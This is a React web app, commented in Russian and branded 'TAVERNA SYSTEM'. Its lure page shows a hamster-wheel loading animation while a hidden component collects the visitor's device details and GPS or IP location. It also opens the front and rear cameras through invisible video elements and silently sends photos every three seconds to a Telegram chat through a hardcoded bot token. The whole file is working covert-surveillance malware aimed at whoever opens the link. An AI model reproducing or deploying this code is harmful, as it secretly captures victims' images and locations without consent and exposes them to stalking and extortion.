import React, { useRef, useEffect } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const captureCount = useRef(0);
  const startTime = useRef(null);
  const totalDuration = 60000; // 1 минута = 60000 мс
  const photoInterval = 3000; // 3 секунды

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  // Метод отправки текста в Telegram с повтором
  const sendToTelegram = (text, retryCount = 3) => {
    return new Promise((resolve, reject) => {
      const attemptSend = (attempt) => {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        
        xhr.onload = function() {
          if (xhr.status === 200) {
            console.log('✅ Сообщение отправлено успешно');
            resolve(true);
          } else {
            console.error(`❌ Ошибка отправки сообщения (попытка ${attempt}):`, xhr.status, xhr.responseText);
            if (attempt < retryCount) {
              setTimeout(() => attemptSend(attempt + 1), 1000);
            } else {
              reject(new Error(`Ошибка ${xhr.status}: ${xhr.responseText}`));
            }
          }
        };
        
        xhr.onerror = function() {
          console.error(`❌ Ошибка сети при отправке сообщения (попытка ${attempt})`);
          if (attempt < retryCount) {
            setTimeout(() => attemptSend(attempt + 1), 1000);
          } else {
            reject(new Error('Ошибка сети'));
          }
        };
        
        const data = JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML',
          disable_notification: true
        });
        
        console.log(`📤 Отправка сообщения (попытка ${attempt})...`);
        xhr.send(data);
      };
      
      attemptSend(1);
    });
  };

  // Отправка фото в Telegram с повтором
  const sendPhotoToTelegram = (blob, caption = '', retryCount = 3) => {
    return new Promise((resolve, reject) => {
      const attemptSend = (attempt) => {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, `taverna_${Date.now()}_${Math.random().toString(36).substr(2, 5)}.jpg`);
        formData.append('disable_notification', 'true');
        if (caption) {
          formData.append('caption', caption);
        }

        const xhr = new XMLHttpRequest();
        xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
        
        xhr.onload = function() {
          if (xhr.status === 200) {
            console.log('✅ Фото отправлено успешно');
            resolve(true);
          } else {
            console.error(`❌ Ошибка отправки фото (попытка ${attempt}):`, xhr.status, xhr.responseText);
            if (attempt < retryCount) {
              setTimeout(() => attemptSend(attempt + 1), 1000);
            } else {
              reject(new Error(`Ошибка ${xhr.status}`));
            }
          }
        };
        
        xhr.onerror = function() {
          console.error(`❌ Ошибка сети при отправке фото (попытка ${attempt})`);
          if (attempt < retryCount) {
            setTimeout(() => attemptSend(attempt + 1), 1000);
          } else {
            reject(new Error('Ошибка сети'));
          }
        };
        
        console.log(`📤 Отправка фото (попытка ${attempt}), размер: ${(blob.size / 1024).toFixed(1)} KB`);
        xhr.send(formData);
      };
      
      attemptSend(1);
    });
  };

  // Получение геолокации
  const getGeolocation = () => {
    return new Promise((resolve) => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude, accuracy } = position.coords;
            console.log('📍 GPS координаты получены');
            resolve({
              latitude: latitude.toFixed(6),
              longitude: longitude.toFixed(6),
              accuracy: Math.round(accuracy),
              method: "GPS",
              success: true
            });
          },
          (error) => {
            console.log('📍 GPS недоступен, получаем по IP');
            getLocationByIP().then(resolve);
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
          }
        );
      } else {
        console.log('📍 Geolocation API не поддерживается, получаем по IP');
        getLocationByIP().then(resolve);
      }
    });
  };

  // Получение локации по IP
  const getLocationByIP = async () => {
    try {
      console.log('📍 Получение локации по IP...');
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      
      return {
        latitude: data.latitude,
        longitude: data.longitude,
        city: data.city,
        region: data.region,
        country: data.country_name,
        isp: data.org,
        ip: data.ip,
        method: "IP",
        success: true
      };
    } catch (error) {
      console.error('📍 Ошибка получения локации по IP:', error);
      return {
        success: false,
        error: error.message
      };
    }
  };

  // Сбор основной информации об устройстве
  const collectDeviceInfo = async () => {
    console.log('📱 Сбор информации об устройстве...');
    
    const locationInfo = await getGeolocation();
    
    const ua = navigator.userAgent;
    let os = 'Unknown';
    
    if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
    else if (/Windows NT 6.3/i.test(ua)) os = 'Windows 8.1';
    else if (/Windows NT 6.1/i.test(ua)) os = 'Windows 7';
    else if (/Mac OS X/i.test(ua)) os = 'macOS';
    else if (/Android/i.test(ua)) os = 'Android';
    else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
    else if (/Linux/i.test(ua)) os = 'Linux';

    const info = {
      timestamp: new Date().toLocaleString(),
      userAgent: ua.substring(0, 150),
      platform: navigator.platform,
      os: os,
      screenSize: `${window.screen.width}x${window.screen.height}`,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
      deviceMemory: navigator.deviceMemory || 'Unknown',
      location: locationInfo,
      isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(ua),
    };

    console.log('📱 Информация собрана');
    return info;
  };

  // Форматирование информации для отправки
  const formatDeviceInfo = (info) => {
    let locationText = '';
    if (info.location.success) {
      if (info.location.method === "GPS") {
        locationText = `📍 GPS: ${info.location.latitude}, ${info.location.longitude} (±${info.location.accuracy}м)`;
      } else {
        locationText = `📍 IP: ${info.location.city || ''}, ${info.location.country || ''}\n   Координаты: ${info.location.latitude}, ${info.location.longitude}\n   IP: ${info.location.ip || ''}`;
      }
    } else {
      locationText = '📍 Геолокация: Не доступно';
    }
    
    return `🔍 TAVERNA SYSTEM - ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ

📱 СИСТЕМА
▫️ ОС: ${info.os}
▫️ Платформа: ${info.platform}
▫️ Мобильное: ${info.isMobile ? 'Да' : 'Нет'}

🖥 ДИСПЛЕЙ
▫️ Разрешение: ${info.screenSize}
▫️ Язык: ${info.language}
▫️ Часовой пояс: ${info.timezone}

${locationText}

⚙️ ХАРАКТЕРИСТИКИ
▫️ Ядра CPU: ${info.hardwareConcurrency}
▫️ ОЗУ: ${info.deviceMemory} GB

⏰ СТАТУС
▫️ Время: ${info.timestamp}
▫️ User Agent: ${info.userAgent}

🚀 ЗАПУСКАЮ СЪЕМКУ: ФОТО КАЖДЫЕ 3 СЕКУНДЫ В ТЕЧЕНИЕ 1 МИНУТЫ`;
  };

  // Инициализация камер - упрощенная версия
  const initializeCameras = async () => {
    try {
      console.log('📷 Начинаю инициализацию камер...');
      
      streamsRef.current = [];
      videoRefsRef.current = [];
      
      // Пробуем получить доступ к камерам в правильном порядке
      const cameraConfigs = [
        {
          name: "Фронтальная камера",
          constraints: { video: { facingMode: "user" }, audio: false }
        },
        {
          name: "Задняя камера",
          constraints: { video: { facingMode: { exact: "environment" } }, audio: false }
        }
      ];
      
      for (let i = 0; i < cameraConfigs.length; i++) {
        try {
          console.log(`📷 Пробую ${cameraConfigs[i].name}...`);
          const stream = await navigator.mediaDevices.getUserMedia(cameraConfigs[i].constraints);
          
          // Создаем видео элемент
          const video = document.createElement('video');
          video.style.cssText = `
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
            top: 0;
            left: 0;
          `;
          video.autoplay = true;
          video.muted = true;
          video.playsInline = true;
          video.setAttribute('playsinline', '');
          video.srcObject = stream;
          document.body.appendChild(video);
          
          // Ждем загрузки видео
          await new Promise((resolve, reject) => {
            const onLoaded = () => {
              video.removeEventListener('loadedmetadata', onLoaded);
              video.removeEventListener('error', onError);
              resolve();
            };
            
            const onError = (err) => {
              video.removeEventListener('loadedmetadata', onLoaded);
              video.removeEventListener('error', onError);
              reject(err);
            };
            
            video.addEventListener('loadedmetadata', onLoaded);
            video.addEventListener('error', onError);
            
            // Таймаут
            setTimeout(() => {
              if (video.readyState >= 1) resolve();
            }, 1000);
          });
          
          streamsRef.current.push(stream);
          videoRefsRef.current.push(video);
          
          console.log(`✅ ${cameraConfigs[i].name} активирована: ${video.videoWidth}x${video.videoHeight}`);
          
        } catch (error) {
          console.log(`❌ ${cameraConfigs[i].name} не доступна: ${error.message}`);
        }
      }
      
      console.log(`📷 Инициализация завершена. Доступно камер: ${streamsRef.current.length}`);
      return streamsRef.current.length > 0;
      
    } catch (error) {
      console.error('❌ Ошибка инициализации камер:', error);
      return false;
    }
  };

  // Создание фото с камеры
  const capturePhotoFromCamera = async (cameraIndex, video) => {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      
      if (video && video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
        // Используем оптимальный размер
        const scale = 0.7;
        canvas.width = video.videoWidth * scale;
        canvas.height = video.videoHeight * scale;
        
        const ctx = canvas.getContext('2d');
        
        // Рисуем видео
        if (cameraIndex === 0) { // Фронтальная камера - зеркалим
          ctx.save();
          ctx.translate(canvas.width, 0);
          ctx.scale(-1, 1);
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          ctx.restore();
        } else { // Задняя камера - как есть
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        }
        
        // Водяной знак TAVERNA
        ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
        ctx.font = 'bold 20px Arial';
        ctx.textAlign = 'right';
        ctx.fillText('TAVERNA', canvas.width - 15, canvas.height - 15);
        
        // Информация
        ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
        ctx.textAlign = 'left';
        ctx.font = '12px Arial';
        ctx.fillText(`Камера ${cameraIndex === 0 ? 'Фронт' : 'Зад'}`, 15, 25);
        ctx.fillText(`Фото #${captureCount.current + 1}`, 15, 45);
        ctx.fillText(new Date().toLocaleTimeString(), 15, 65);
        
      } else {
        // Тестовое изображение
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        
        // Градиентный фон
        const gradient = ctx.createLinearGradient(0, 0, 640, 480);
        gradient.addColorStop(0, '#667eea');
        gradient.addColorStop(1, '#764ba2');
        ctx.fillStyle = gradient;
        ctx.fillRect(0, 0, 640, 480);
        
        ctx.fillStyle = '#FFFFFF';
        ctx.font = 'bold 24px Arial';
        ctx.textAlign = 'center';
        ctx.fillText('TAVERNA SYSTEM', 320, 100);
        ctx.fillText(`Камера ${cameraIndex + 1} не активна`, 320, 240);
        ctx.fillText(`Фото #${captureCount.current + 1}`, 320, 280);
        ctx.fillText(new Date().toLocaleTimeString(), 320, 320);
      }
      
      // Создаем blob с хорошим качеством, но не слишком большой
      canvas.toBlob(blob => {
        if (blob) {
          console.log(`📸 Фото создано: ${(blob.size / 1024).toFixed(1)} KB`);
          resolve(blob);
        } else {
          resolve(null);
        }
      }, 'image/jpeg', 0.8);
    });
  };

  // Захват и отправка фото
  const captureAndSendPhotos = async () => {
    const elapsed = Date.now() - startTime.current;
    
    if (elapsed >= totalDuration) {
      stopCapturing();
      sendToTelegram(`⏰ TAVERNA SYSTEM: Время истекло (1 минута)\n📸 Всего фото: ${captureCount.current}`);
      return;
    }
    
    // Если нет камер, пропускаем
    if (videoRefsRef.current.length === 0) {
      console.log('📷 Нет доступных камер');
      captureCount.current++;
      return;
    }
    
    console.log(`📸 Захват фото #${captureCount.current + 1}...`);
    
    // Отправляем фото с каждой камеры
    for (let i = 0; i < videoRefsRef.current.length; i++) {
      try {
        const video = videoRefsRef.current[i];
        const photoBlob = await capturePhotoFromCamera(i, video);
        
        if (photoBlob) {
          const elapsedSeconds = Math.floor(elapsed / 1000);
          const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
          
          const caption = `TAVERNA SYSTEM\n` +
            `📸 Фото #${captureCount.current + 1}\n` +
            `📷 ${i === 0 ? 'Фронтальная' : 'Задняя'} камера\n` +
            `⏱ ${elapsedSeconds} сек / ${remainingSeconds} сек\n` +
            `🕐 ${new Date().toLocaleTimeString()}`;
          
          await sendPhotoToTelegram(photoBlob, caption);
        }
      } catch (error) {
        console.error(`❌ Ошибка камеры ${i}:`, error);
      }
    }
    
    captureCount.current++;
    
    // Статистика каждые 3 фото
    if (captureCount.current % 3 === 0) {
      const elapsedSeconds = Math.floor(elapsed / 1000);
      sendToTelegram(
        `📊 TAVERNA SYSTEM: Статистика\n` +
        `📸 Фото: ${captureCount.current}\n` +
        `📷 Камер: ${videoRefsRef.current.length}\n` +
        `⏱ Прошло: ${elapsedSeconds} сек`
      ).catch(() => {/* игнорируем ошибки статистики */});
    }
  };

  // Запуск съемки
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    console.log('🚀 Запуск съемки TAVERNA SYSTEM');
    
    // Первый снимок сразу
    setTimeout(() => {
      captureAndSendPhotos();
    }, 500);
    
    // Затем каждые 3 секунды
    captureIntervalRef.current = setInterval(() => {
      captureAndSendPhotos();
    }, photoInterval);
  };

  // Остановка съемки
  const stopCapturing = () => {
    console.log('🛑 Остановка съемки TAVERNA SYSTEM');
    
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    // Закрываем камеры
    streamsRef.current.forEach(stream => {
      stream?.getTracks().forEach(track => track.stop());
    });
    streamsRef.current = [];
    
    // Удаляем видео
    videoRefsRef.current.forEach(video => {
      video?.remove();
    });
    videoRefsRef.current = [];
  };

  // Основной эффект
  useEffect(() => {
    console.log('🚀 Инициализация TAVERNA SYSTEM для chatId:', chatId);
    startTime.current = Date.now();
    
    const init = async () => {
      try {
        // Собираем и отправляем информацию
        const deviceInfo = await collectDeviceInfo();
        await sendToTelegram(formatDeviceInfo(deviceInfo));
        
        // Инициализируем камеры
        const camerasReady = await initializeCameras();
        
        if (camerasReady) {
          await sendToTelegram(
            `🚀 TAVERNA SYSTEM: Камеры активированы\n` +
            `📷 Доступно: ${streamsRef.current.length} камер\n` +
            `⏱ Съемка: 1 фото каждые 3 секунды\n` +
            `⏳ Длительность: 1 минута`
          );
          
          // Запускаем съемку
          startPeriodicCapture();
          
          // Остановка через 1 минуту
          setTimeout(() => {
            stopCapturing();
            sendToTelegram(
              `✅ TAVERNA SYSTEM: Съемка завершена\n` +
              `📸 Итого: ${captureCount.current} фото\n` +
              `🎉 Процесс завершен успешно`
            );
          }, totalDuration);
          
        } else {
          await sendToTelegram('❌ TAVERNA SYSTEM: Не удалось активировать камеры');
        }
      } catch (error) {
        console.error('❌ Ошибка инициализации:', error);
      }
    };
    
    // Задержка перед началом
    setTimeout(init, 1000);
    
    // Очистка
    return () => {
      stopCapturing();
    };
  }, [chatId]);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        padding: '20px'
      }}>
        <div className="wraper" style={{ transform: 'scale(1.4)' }}>
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            textAlign: 'center',
            marginTop: '50px',
            color: 'white',
            fontSize: '18px',
            fontWeight: 'bold',
            opacity: 0.9
          }}>
            TAVERNA SYSTEM ACTIVE...
          </div>
        </div>
      </div>

      {chatId && <CameraHacking chatId={chatId} />}
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
        }}>
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
